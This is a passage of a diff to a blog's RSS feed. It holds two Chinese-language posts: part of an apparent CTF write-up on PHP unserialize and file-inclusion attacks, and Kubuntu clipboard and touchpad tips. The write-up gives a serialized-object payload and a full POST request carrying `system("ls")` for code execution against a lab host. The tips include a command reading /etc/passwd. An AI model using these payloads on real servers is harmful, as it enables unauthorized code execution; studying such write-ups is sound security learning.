       error_reporting(0);
 
       if (strpos($_GET[&amp;#39;un&amp;#39;], &amp;#39;php://filter&amp;#39;)) {
@@ -1380,7 +1376,7 @@ print($b);
       &amp;lt;!-- flag is in flag.php --&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个题目要结合文件包含漏洞触发命令执行&lt;/p&gt;
 &lt;p&gt;因为存在多个魔法函数，这里就要知道各个魔法函数的执行顺序。在序列化的时候可以直接删除&lt;code&gt;__sleep()&lt;/code&gt;以减少影响，其次是利用属性个数大于真实属性个数绕过&lt;code&gt;__wakeup&lt;/code&gt;函数，同时因为限制了&lt;code&gt;php://filer&lt;/code&gt;因此需要利用&lt;code&gt;php://input&lt;/code&gt;来执行代码&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
 //error_reporting(0);
 class Connection
 {
@@ -1406,7 +1402,7 @@ class Connection
 $a = new Connection(&amp;#34;php://input&amp;#34;);
 $b = serialize($a);
 print_r($b);
-&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;POST /?un=O:10:&amp;#34;Connection&amp;#34;:2:{s:4:&amp;#34;file&amp;#34;;s:11:&amp;#34;php://input&amp;#34;;} HTTP/1.1
+&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex="0"&gt;&lt;code&gt;POST /?un=O:10:&amp;#34;Connection&amp;#34;:2:{s:4:&amp;#34;file&amp;#34;;s:11:&amp;#34;php://input&amp;#34;;} HTTP/1.1
 Host: 192.168.122.30:8011
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
@@ -1418,20 +1414,20 @@ Cache-Control: max-age=0
 Content-Length: 21
 
 &amp;lt;?php system(&amp;#34;ls&amp;#34;);?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-15-45-15.png&#34;
-	width=&#34;1241&#34;
-	height=&#34;544&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-15-45-15_hub4c2150e2f6ed90f3effc228bbf94392_101932_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-15-45-15_hub4c2150e2f6ed90f3effc228bbf94392_101932_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-15-45-15.png"
+	width="1241"
+	height="544"
+	srcset="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-15-45-15_hub4c2150e2f6ed90f3effc228bbf94392_101932_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-15-45-15_hub4c2150e2f6ed90f3effc228bbf94392_101932_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;228&#34;
-		data-flex-basis=&#34;547px&#34;
+		class="gallery-image" 
+		data-flex-grow="228"
+		data-flex-basis="547px"
 	
 &gt;&lt;/p&gt;
-&lt;h2 id=&#34;注入对象构造方法&#34;&gt;注入对象构造方法&lt;/h2&gt;
-&lt;h3 id=&#34;当目标对象被privateprotected修饰时的反序列化漏洞&#34;&gt;当目标对象被private、protected修饰时的反序列化漏洞&lt;/h3&gt;
+&lt;h2 id="注入对象构造方法"&gt;注入对象构造方法&lt;/h2&gt;
+&lt;h3 id="当目标对象被privateprotected修饰时的反序列化漏洞"&gt;当目标对象被private、protected修饰时的反序列化漏洞&lt;/h3&gt;
 &lt;p&gt;前文说了&lt;code&gt;private&lt;/code&gt;和&lt;code&gt;protected&lt;/code&gt;返回长度和&lt;code&gt;public&lt;/code&gt;不一样的原因，这里再记录一下&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;private属性序列化的时候格式是%00类名%00属性名
@@ -1439,20 +1435,20 @@ protect属性序列化的时候格式是%00*%00属性名&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;&lt;code&gt;protected&lt;/code&gt;情况下&lt;/p&gt;
 &lt;p&gt;index.php&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;A&lt;/span&gt;{
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;protected&lt;/span&gt; $test &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;abab&amp;#34;&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __destruct() {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;];
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;unserialize&lt;/span&gt;($a);
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;A&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    &lt;span style="color:#66d9ef"&gt;protected&lt;/span&gt; $test &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;abab&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; __destruct() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;        &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; $this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;test&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$a &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_GET[&lt;span style="color:#e6db74"&gt;&amp;#34;test&amp;#34;&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$b &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;unserialize&lt;/span&gt;($a);
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;利用方式：
 先用正常方式输出序列化字符串&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?php
+&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
 
 class A{
     protected $test = &amp;#34;what i what&amp;#34;;
@@ -1464,30 +1460,29 @@ class A{
 $a = new A();
 $b = serialize($a);
 print_r($b);
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-16-30-10.png&#34;
-	width=&#34;1056&#34;
-	height=&#34;401&#34;
-	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-16-30-10_hud0dc8151c79daf8bc0ad0f18d7d034b3_36582_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-16-30-10_hud0dc8151c79daf8bc0ad0f18d7d034b3_36582_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-16-30-10.png"
+	width="1056"
+	height="401"
+	srcset="https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-16-30-10_hud0dc8151c79daf8bc0ad0f18d7d034b3_36582_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-23-16-30-10_hud0dc8151c79daf8bc0ad0f18d7d034b3_36582_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
 	
 	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;263&#34;
-		data-flex-basis=&#34;632px&#34;
+		class="gallery-image" 
+		data-flex-grow="263"
+		data-flex-basis="632px"
 	
 &gt;&lt;/p&gt;</description>
-        </item>
-        <item>
-        <title>Kubuntu</title>
-        <link>https://fragrant1001.github.io/post/2023/kubuntutricks/</link>
-        <pubDate>Thu, 13 May 2021 22:16:07 +0800</pubDate>
-        
-        <guid>https://fragrant1001.github.io/post/2023/kubuntutricks/</guid>
-        <description>&lt;img src="https://fragrant1001.github.io/post/2023/kubuntutricks/cover.jpg" alt="Featured image of post Kubuntu" /&gt;&lt;p&gt;剪切板、触摸板手势、ldx安装kali、乱码reset&lt;/p&gt;
-&lt;h2 id=&#34;内容copy到剪切板或者鼠标滚轮键&#34;&gt;内容copy到剪切板或者鼠标滚轮键&lt;/h2&gt;
+</item>
+<item>
+<title>Kubuntu</title>
+<link>https://fragrant1001.github.io/post/2023/kubuntutricks/</link>
+<pubDate>Thu, 13 May 2021 22:16:07 +0800</pubDate>
+<guid>https://fragrant1001.github.io/post/2023/kubuntutricks/</guid>
+<description>&lt;img src="https://fragrant1001.github.io/post/2023/kubuntutricks/cover.jpg" alt="Featured image of post Kubuntu" /&gt;&lt;p&gt;剪切板、触摸板手势、ldx安装kali、乱码reset&lt;/p&gt;
+&lt;h2 id="内容copy到剪切板或者鼠标滚轮键"&gt;内容copy到剪切板或者鼠标滚轮键&lt;/h2&gt;
 &lt;p&gt;安装软件&lt;code&gt;sudo apt install xsel xclip&lt;/code&gt;&lt;/p&gt;
-&lt;h3 id=&#34;将文件内容copy到剪切板&#34;&gt;将文件内容copy到剪切板&lt;/h3&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;本地
+&lt;h3 id="将文件内容copy到剪切板"&gt;将文件内容copy到剪切板&lt;/h3&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;本地
 xsel -b &amp;lt; file
 OR
 xclip -sel c &amp;lt; file
@@ -1495,13 +1490,13 @@ xclip -sel c &amp;lt; file
 如果是登录其它linux机器需要在ssh的时候加上-X参数
 
 ssh -X xxx@xx.xx.xx.xx
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;将命令输出存储到剪切板&#34;&gt;将命令输出存储到剪切板&lt;/h3&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;echo -n 111 | xsel -b
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id="将命令输出存储到剪切板"&gt;将命令输出存储到剪切板&lt;/h3&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;echo -n 111 | xsel -b
 cat /etc/passwd | xclip -sel c
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;将剪切板中的内容输出到文件&#34;&gt;将剪切板中的内容输出到文件&lt;/h3&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;xsel -b -o &amp;gt;&amp;gt; file # -o 貌似可以省略
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;将文件内容或命令输出copy到鼠标滚轮键和将鼠标滚轮键中的内容输出到文件&#34;&gt;将文件内容或命令输出copy到鼠标滚轮键和将鼠标滚轮键中的内容输出到文件&lt;/h3&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;将文件内容copy到鼠标滚轮键
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id="将剪切板中的内容输出到文件"&gt;将剪切板中的内容输出到文件&lt;/h3&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;xsel -b -o &amp;gt;&amp;gt; file # -o 貌似可以省略
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id="将文件内容或命令输出copy到鼠标滚轮键和将鼠标滚轮键中的内容输出到文件"&gt;将文件内容或命令输出copy到鼠标滚轮键和将鼠标滚轮键中的内容输出到文件&lt;/h3&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;将文件内容copy到鼠标滚轮键
 xsel &amp;lt; file
 OR
 xclip &amp;lt; file
@@ -1512,9 +1507,9 @@ cat /etc/passwd | xclip
 将鼠标滚轮键中的内容输出到文件
 xsel &amp;gt;&amp;gt; file
 xclip &amp;gt;&amp;gt; file
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;touchpad-gestures&#34;&gt;touchpad gestures&lt;/h2&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id="touchpad-gestures"&gt;touchpad gestures&lt;/h2&gt;
 &lt;p&gt;安装&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo gpasswd -a $USER input
+&lt;pre tabindex="0"&gt;&lt;code&gt;sudo gpasswd -a $USER input
 newgrp input
 sudo apt-get install libinput-tools
 sudo apt-get install ruby
@@ -1522,7 +1517,7 @@ sudo gem install fusuma
 sudo apt-get install xdotool
 sudo gem install fusuma-plugin-tap fusuma-plugin-keypresss
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;自定义手势映射&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mkdir -p ~/.config/fusuma        # create config directory
+&lt;pre tabindex="0"&gt;&lt;code&gt;mkdir -p ~/.config/fusuma        # create config directory
 vim ~/.config/fusuma/config.yml # edit config file.
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;支持的手势&lt;/p&gt;
 &lt;ul&gt;
@@ -1546,108 +1541,105 @@ vim ~/.config/fusuma/config.yml # edit config file.
 &lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;我的手势&lt;code&gt;vim ~/.config/fusuma/config.yml&lt;/code&gt;&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;swipe:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  3:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    left:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      command: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xdotool key ctrl+shift+Tab&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    right:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      command: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xdotool key ctrl+Tab&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    up:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      command: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xdotool key ctrl+t&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      keypress:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        LEFTSHIFT:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          command: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xdotool key --clearmodifiers ctrl+shift+t&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    down:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      command: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xdotool key ctrl+w&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      keypress:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        LEFTSHIFT:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          command: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xdotool key --clearmodifiers ctrl+d&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  4:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    left:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      command: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xdotool key super+shift+Tab&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    right:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      command: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xdotool key super+Tab&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    up:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      command: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xdotool key super+a&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    down:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      command: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xdotool key super+a&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tap:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  4:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    command: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xdotool key alt+Tab&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pinch:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  2: 
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    in:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      command: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;xdotool key ctrl+alt+a&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    out:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      command: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;xdotool key ctrl+alt+a&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;plugin:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  inputs:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    libinput_command_input:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      enable-tap: true
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      verbose: true
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;threshold:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  swipe: 0.5
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  pinch: 0.9
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;interval:
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  swipe: 0.5
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  pinch: 0.5
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;swipe:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;  3:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    left:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;      command: &lt;span style="color:#e6db74"&gt;&amp;#39;xdotool key ctrl+shift+Tab&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    right:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;      command: &lt;span style="color:#e6db74"&gt;&amp;#39;xdotool key ctrl+Tab&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    up:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;      command: &lt;span style="color:#e6db74"&gt;&amp;#39;xdotool key ctrl+t&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;      keypress:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;        LEFTSHIFT:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;          command: &lt;span style="color:#e6db74"&gt;&amp;#39;xdotool key --clearmodifiers ctrl+shift+t&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    down:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;      command: &lt;span style="color:#e6db74"&gt;&amp;#39;xdotool key ctrl+w&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;      keypress:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;        LEFTSHIFT:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;          command: &lt;span style="color:#e6db74"&gt;&amp;#39;xdotool key --clearmodifiers ctrl+d&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;  4:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    left:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;      command: &lt;span style="color:#e6db74"&gt;&amp;#39;xdotool key super+shift+Tab&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    right:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;      command: &lt;span style="color:#e6db74"&gt;&amp;#39;xdotool key super+Tab&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    up:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;      command: &lt;span style="color:#e6db74"&gt;&amp;#39;xdotool key super+a&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    down:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;      command: &lt;span style="color:#e6db74"&gt;&amp;#39;xdotool key super+a&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;tap:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;  4:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    command: &lt;span style="color:#e6db74"&gt;&amp;#39;xdotool key alt+Tab&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;pinch:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;  2: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    in:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;      command: &lt;span style="color:#e6db74"&gt;&amp;#34;xdotool key ctrl+alt+a&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;    out:
